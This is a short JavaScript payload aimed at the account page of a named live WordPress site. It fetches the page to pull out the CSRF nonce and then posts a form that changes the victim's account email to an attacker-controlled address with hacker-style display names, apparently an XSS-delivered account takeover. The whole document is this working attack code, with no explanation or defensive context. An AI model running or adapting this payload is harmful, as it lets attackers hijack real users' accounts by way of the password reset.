    function changeEmail(csrf_token) {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          void(0);
        }
      };
      xhttp.open("POST", "https://business.kinepolis.lu/mon-compte/edit-account/", true);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.send("account_first_name=leeasassat&account_last_name=brqwqo&account_display_name=hackweweer123&account_email=backdoor10wewe2@tutanota.com&password_current=&password_1=&password_2=&save-account-details-nonce="+csrf_token+"&_wp_http_referer=/mon-compte/edit-account/&save_account_details=Enregistrer les modifications&action=save_account_details");
    }

    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        parser = new DOMParser();
        doc = parser.parseFromString(this.responseText, "text/html");
        changeEmail(doc.getElementById('save-account-details-nonce').value) 
    }
    };
    xhttp.open("GET", "https://business.kinepolis.lu/mon-compte/edit-account/", true);
    xhttp.send();























































